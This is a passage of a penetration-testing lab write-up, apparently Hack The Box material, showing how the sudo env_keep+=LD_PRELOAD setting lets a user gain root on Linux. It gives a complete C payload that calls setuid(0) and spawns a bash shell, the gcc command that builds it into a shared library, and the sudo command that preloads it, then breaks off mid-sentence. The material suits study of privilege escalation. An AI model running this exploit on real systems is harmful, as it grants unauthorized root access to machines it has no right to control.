The prerequisite of this technique is to require user to met the following:

1: A specific entry, env_keep+=LD_PRELOAD must be presence when running sudo -l, usually when calling sudo, environment variables are stripped but this line forces the environment variable, LD_PRELOAD, to stay
2: some sort of sudo access without password

Take the following example:
```
htb_student@NIX02:~$ sudo -l

Matching Defaults entries for daniel.carter on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User daniel.carter may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/apache2 restart
```

The LD_PRELOAD environment variable forces linux to load a library before executing a binary, this is originally intended to let programmers to provide hotfix or patches quickly without the need to recompile whole program, however in our case, we can abuse this by forcing linux to load a malicious binary before executing binary

The following is an example of payload we can use, we save it as root.c:
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

Then, we compile it:
```
htb_student@NIX02:~$ gcc -fPIC -shared -o root.so root.c -nostartfiles
```

Next, we set LD_PRELOAD then execute our command:
```
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

Notice that if the payload is correct, it doesn't matter whatever we are trying to execute, the `/usr/sbin/apache2 restart` would never have a chance to execute as before it can, a root bash shell will be spawned, even if the command we are executing may cause disruption to production (like restarting apache2 server), we wou